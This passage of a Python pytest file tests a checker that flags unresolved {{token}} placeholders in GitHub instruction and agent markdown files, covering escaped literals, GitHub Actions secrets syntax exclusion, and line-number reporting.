        instr_dir = tmp_path / ".github" / "instructions"
        instr_dir.mkdir(parents=True)
        (instr_dir / "bad.instructions.md").write_text(
            "# Bad\n\nSee {{paths.missing_path}} for details.\n",
            encoding="utf-8",
        )

        _check_tokens.main([str(tmp_path)])
        captured = capsys.readouterr()
        assert "{{paths.missing_path}}" in captured.out
        assert "bad.instructions.md" in captured.out

    def test_escaped_literal_not_flagged(self, tmp_path):
        r"""\\{{token}} escape markers are intentional literals — not flagged."""
        instr_dir = tmp_path / ".github" / "instructions"
        instr_dir.mkdir(parents=True)
        (instr_dir / "escaped.instructions.md").write_text(
            "# Escaped\n\nUse `\\{{project.name}}` syntax to reference tokens.\n",
            encoding="utf-8",
        )

        rc = _check_tokens.main([str(tmp_path)])
        assert rc == 0

    def test_github_actions_syntax_not_flagged(self, tmp_path):
        """${{secrets.TOKEN}} GitHub Actions syntax is excluded by the regex."""
        agents_dir = tmp_path / ".github" / "agents"
        agents_dir.mkdir(parents=True)
        (agents_dir / "workflow.agent.md").write_text(
            "---\nname: ci\n---\n\nToken: ${{ secrets.GITHUB_TOKEN }}\n",
            encoding="utf-8",
        )

        rc = _check_tokens.main([str(tmp_path)])
        assert rc == 0

    def test_missing_scan_dirs_exit_0(self, tmp_path):
        """No .github/ subdirs present → nothing to scan → returns 0."""
        rc = _check_tokens.main([str(tmp_path)])
        assert rc == 0

    def test_check_file_returns_line_numbers(self, tmp_path):
        """check_file returns correct 1-based line numbers for each finding."""
        md = tmp_path / "test.md"
        md.write_text(
            "# Header\n\nLine two is clean.\n{{first.token}}\nclean\n{{second.token}}\n",
            encoding="utf-8",
        )

        findings = _check_tokens.check_file(md)
        assert len(findings) == 2
        assert findings[0] == (4, "{{first.token}}")
        assert findings[1] == (6, "{{second.token}}")
